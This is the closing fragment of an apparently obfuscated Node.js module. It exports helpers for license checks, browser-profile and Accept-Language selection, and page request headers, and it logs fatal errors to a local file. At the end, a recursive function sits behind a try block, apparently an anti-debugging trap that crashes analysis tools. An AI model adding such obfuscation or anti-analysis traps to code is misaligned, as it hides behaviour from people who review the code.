validateLicense, v120.sleep = sleep, v120.uuid = uuid, v120.dbg = dbg, v120.cdbg = cdbg, v120.setSelectedBrowsers = setSelectedBrowsers, v120.resolveLanguageForRequest = resolveLanguageForRequest, v120.selectAcceptLanguage = selectAcceptLanguage, v120.selectBrowserProfile = selectBrowserProfile, v120.parseCustomBrowserInput = parseCustomBrowserInput, v120.getPageGetHeaders = getPageGetHeaders, module.exports = v120;
(require.main === module || !module.parent || require.main && require.main.filename === module.filename) && main().catch(v2047 => {
  try {
    fs.appendFileSync(path.join(__dirname, "fatal_error.log"), '[' + new Date().toISOString() + ']\x20' + (v2047.stack || v2047) + '\x0a');
  } catch (v2048) {}
  console.log(R("\n  [!] Fatal: " + v2047.message + '\x0a')), process.exit(0x1);
});
function fn2(v2049) {
  function fn28(v2050) {
    fn28(++v2050);
  }
  try {
    if (v2049) return fn28;else fn28(0x0);
  } catch (v2051) {}
}